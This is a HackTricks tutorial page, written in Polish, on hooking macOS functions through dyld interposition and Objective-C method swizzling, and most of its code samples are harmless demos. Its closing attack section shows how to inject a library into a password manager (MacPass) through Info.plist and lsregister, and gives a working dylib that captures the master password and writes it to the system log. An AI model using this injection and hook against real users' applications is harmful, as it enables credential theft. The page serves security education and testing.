# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Interpozycja funkcji

Utwórz **dylib** z sekcją **`__interpose` (`__DATA___interpose`)** (lub sekcją oznaczoną jako **`S_INTERPOSING`**) zawierającą krotki **wskaźników funkcji**, które odnoszą się do **oryginalnych** i **zamiennych** funkcji.

Następnie **wstrzyknij** dylib za pomocą **`DYLD_INSERT_LIBRARIES`** (interpozycja musi nastąpić przed załadowaniem głównej aplikacji). Oczywiście [**ograniczenia** dotyczące użycia **`DYLD_INSERT_LIBRARIES`** mają tu również zastosowanie](macos-library-injection/#check-restrictions).

### Interpozycja printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Zmienna środowiskowa **`DYLD_PRINT_INTERPOSTING`** może być używana do debugowania interpozycji i wydrukuje proces interpozycji.

Należy również zauważyć, że **interpozycja zachodzi pomiędzy procesem a załadowanymi bibliotekami**, nie działa z pamięcią podręczną bibliotek współdzielonych.

### Dynamiczna Interpozycja

Teraz możliwe jest również dynamiczne interponowanie funkcji za pomocą funkcji **`dyld_dynamic_interpose`**. Umożliwia to programowe interponowanie funkcji w czasie rzeczywistym, zamiast robienia tego tylko na początku.

Wystarczy wskazać **krotki** funkcji do zastąpienia oraz funkcji zastępującej.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

W ObjectiveC wywołanie metody wygląda tak: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Potrzebny jest **obiekt**, **metoda** i **parametry**. A gdy metoda jest wywoływana, **msg jest wysyłany** za pomocą funkcji **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Obiekt to **`someObject`**, metoda to **`@selector(method1p1:p2:)`**, a argumenty to **value1**, **value2**.

Śledząc struktury obiektów, możliwe jest dotarcie do **tablicy metod**, w której **nazwy** i **wskaźniki** do kodu metody są **zlokalizowane**.

> [!CAUTION]
> Zauważ, że ponieważ metody i klasy są dostępne na podstawie ich nazw, te informacje są przechowywane w binarnym pliku, więc można je odzyskać za pomocą `otool -ov </path/bin>` lub [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Możliwe jest uzyskanie informacji o metodach, takich jak nazwa, liczba parametrów lub adres, jak w poniższym przykładzie:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling z method_exchangeImplementations

Funkcja **`method_exchangeImplementations`** pozwala na **zmianę** **adresu** **implementacji** **jednej funkcji na drugą**.

> [!CAUTION]
> Tak więc, gdy funkcja jest wywoływana, to **wykonywana jest ta druga**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> W tym przypadku, jeśli **kod implementacji legitnego** metody **weryfikuje** **nazwę** **metody**, może **wykryć** to swizzling i zapobiec jego uruchomieniu.
>
> Następująca technika nie ma tego ograniczenia.

### Swizzling metod z method_setImplementation

Poprzedni format jest dziwny, ponieważ zmieniasz implementację 2 metod jedna na drugą. Używając funkcji **`method_setImplementation`**, możesz **zmienić** **implementację** **metody na inną**.

Pamiętaj tylko, aby **zachować adres implementacji oryginalnej** metody, jeśli zamierzasz ją wywołać z nowej implementacji przed nadpisaniem, ponieważ później będzie znacznie trudniej zlokalizować ten adres.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologia Ataku Hooking

Na tej stronie omówiono różne sposoby hookowania funkcji. Jednak polegały one na **uruchamianiu kodu wewnątrz procesu w celu ataku**.

Aby to zrobić, najłatwiejszą techniką do użycia jest wstrzyknięcie [Dyld za pomocą zmiennych środowiskowych lub przejęcia](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Jednak przypuszczam, że można to również zrobić za pomocą [wstrzykiwania procesu Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Jednak obie opcje są **ograniczone** do **niechronionych** binarek/procesów. Sprawdź każdą technikę, aby dowiedzieć się więcej o ograniczeniach.

Jednak atak hookowania funkcji jest bardzo specyficzny, atakujący zrobi to, aby **ukraść wrażliwe informacje z wnętrza procesu** (gdyby nie, po prostu przeprowadziłby atak wstrzykiwania procesu). A te wrażliwe informacje mogą znajdować się w aplikacjach pobranych przez użytkownika, takich jak MacPass.

Zatem wektorem ataku byłoby znalezienie luki lub usunięcie podpisu aplikacji, wstrzyknięcie zmiennej środowiskowej **`DYLD_INSERT_LIBRARIES`** przez Info.plist aplikacji, dodając coś takiego:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
a następnie **zarejestruj ponownie** aplikację:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Dodaj do tej biblioteki kod hookujący do eksfiltracji informacji: Hasła, wiadomości...

> [!CAUTION]
> Zauważ, że w nowszych wersjach macOS, jeśli **usunięto podpis** binarnego pliku aplikacji i był on wcześniej uruchamiany, macOS **nie będzie już uruchamiać aplikacji**.

#### Przykład biblioteki
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Odniesienia

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
